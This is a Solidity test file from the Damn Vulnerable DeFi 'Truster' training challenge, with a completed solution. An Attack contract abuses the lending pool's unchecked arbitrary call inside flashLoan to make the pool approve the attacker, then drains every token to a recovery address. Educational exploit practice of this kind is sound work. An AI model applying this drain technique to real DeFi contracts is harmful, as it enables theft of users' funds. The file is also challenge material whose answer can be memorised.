// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // The pool has a flashLoan function that allows anyone to borrow tokens with no fee
        // it calls a function on a target address
        // then check if the pool has the same amount of tokens after the call or more
        // if it has less, the call failed and the transaction is reverted

        // The goal is to drain the pool of all tokens and send them to the recovery account
        // We can pass this test by approving all the tokens to the attacker contract when it is executing the target.functionCall(data) call 
        // and then calling the transfer function to send all the tokens to the recovery account

        Attack attackContract = new Attack(pool, recovery, token);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attack {
    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token) {
        // Call the flashLoan function with the attacker contract
        // function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        uint256 amount = token.balanceOf(address(pool));
        // notice that the target is the token address and the data is the approve function
        // this will be called by the pool contract (target.functionCall(data)) = token.approve(address(this), amount)
        pool.flashLoan(0, address(pool), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), amount));
        // Transfer all the tokens to the recovery account using the allowance we got from the approve function
        token.transferFrom(address(pool), recovery, amount);
    }

}